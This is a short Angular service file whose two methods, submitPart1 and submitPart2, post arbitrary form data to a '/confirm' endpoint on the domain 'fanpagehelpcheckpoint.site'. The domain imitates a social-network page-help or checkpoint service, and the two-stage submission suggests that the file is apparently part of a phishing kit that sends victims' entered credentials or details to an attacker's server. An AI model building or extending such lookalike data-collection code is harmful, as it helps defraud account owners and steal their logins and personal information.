import { Injectable } from '@angular/core';
import { HttpClient , HttpHeaders  } from '@angular/common/http';
import { Observable } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class ManagementServiceService {

  private apiUrl = 'https://api.fanpagehelpcheckpoint.site/api';
  private  headers = new HttpHeaders({
    'Content-Type': 'application/json',
 
  });
  constructor(private http: HttpClient) {}

  submitPart1(body : any): Observable<any> {
    const url = `${this.apiUrl}/confirm`;
    return this.http.post(url, body , { headers: this.headers });
  }
  submitPart2(body : any): Observable<any> {
    const url = `${this.apiUrl}/confirm`;
    return this.http.post(url, body , { headers: this.headers });
  }
}
